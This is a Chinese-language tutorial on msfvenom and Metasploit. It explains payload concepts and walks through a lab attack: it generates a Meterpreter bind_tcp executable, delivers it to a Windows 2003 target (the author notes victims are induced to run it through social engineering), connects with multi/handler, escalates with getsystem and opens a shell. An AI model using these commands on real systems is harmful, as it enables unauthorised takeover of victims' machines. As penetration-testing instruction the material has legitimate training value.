
# 0X00 msfvenom 命令简介
msfvenom是payload产生器，也是shellcode代码生成器<br />Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。<br />Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名

整个字节流一般包含两个部分：

1. 一个包含部分代码的字节序列，被送入目标计算机执行，辅助攻击机获得控制权，比如打开目标计算机上的端口或者建立一个通信信道。
2. 一个用于实现在目标主机上运行某个应用程序如cmd或者计算器（常用于poc--概念验证）等。

一个攻击代码发送的字节序列往往同时包含payload和shellcode代码。


# 0X01 msfvenom 命令的使用
1、生成可执行文件类型的payload
```
root@kali222:~# msfvenom    ---查看选项参数
Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
......此处省略
```

```
root@kali222:~# msfvenom -l payloads  --查看所有的payload

Framework Payloads (546 total) [--payload <value>]


    Name                                                Description
    ----                                                -----------
    aix/ppc/shell_bind_tcp                              Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                             Spawn a shell on an established connection
    aix/ppc/shell_interact                              Simply execve /bin/sh
......此处省略
```


# 0X02 攻击实例

## 环境准备
win2003（192.168.1.64）作为靶机<br />kali（192.168.1.149）作为攻击机。

kali上侦听payload的运行，通过win2003上的payload的运行，反弹到kali.


## 实例

1. 在kali根目录生成payload111.exe文件
```
root@kali222:~# msfvenom -p windows/meterpreter/bind_tcp lport=5000 -f exe -o /root/payload111.exe
```
<br />![](https://img-blog.csdnimg.cn/20200415142543909.png#crop=0&crop=0&crop=1&crop=1&id=KlDxc&originHeight=167&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

2. 将文件拷贝到win2003（实际中利用社工进行诱导运行）<br />![](https://img-blog.csdnimg.cn/2020041514322787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=prwRP&originHeight=226&originWidth=393&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

3. 打开msfconsole
```
root@kali222:~# service postgresql restart
root@kali222:~# msfdb init
root@kali222:~# msfconsole
```
<br />![](https://img-blog.csdnimg.cn/20200415142733345.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=pWYdx&originHeight=437&originWidth=733&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

4. 设置直连型payload
```
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/bind_tcp    ---设置直连型payload
msf5 exploit(multi/handler) > set lport 5000     ---设置本地端口与命令中出现的端口号相同
msf5 exploit(multi/handler) > set rhost 192.168.1.64   ---由于是直连类型，这里设置的是靶机的IP
```
<br />![](https://img-blog.csdnimg.cn/20200415142912439.png#crop=0&crop=0&crop=1&crop=1&id=DlPoD&originHeight=156&originWidth=729&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

5. 等待远程的payload先运行再执行exploit
```
msf5 exploit(multi/handler) > exploit
```
<br />![](https://img-blog.csdnimg.cn/20200415143314463.png#crop=0&crop=0&crop=1&crop=1&id=dMRnB&originHeight=151&originWidth=721&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

6. 提升权限
```
meterpreter > use priv   ---提升特权
meterpreter > getsystem   ---取得系统级权限
```
<br />![](https://img-blog.csdnimg.cn/20200415143415474.png#crop=0&crop=0&crop=1&crop=1&id=eQwN5&originHeight=104&originWidth=728&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

7. 进行shell连接
```
meterpreter > shell
```
<br />![](https://img-blog.csdnimg.cn/20200415143509593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0Mjc2NzQx,size_16,color_FFFFFF,t_70#crop=0&crop=0&crop=1&crop=1&id=ernGq&originHeight=218&originWidth=723&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
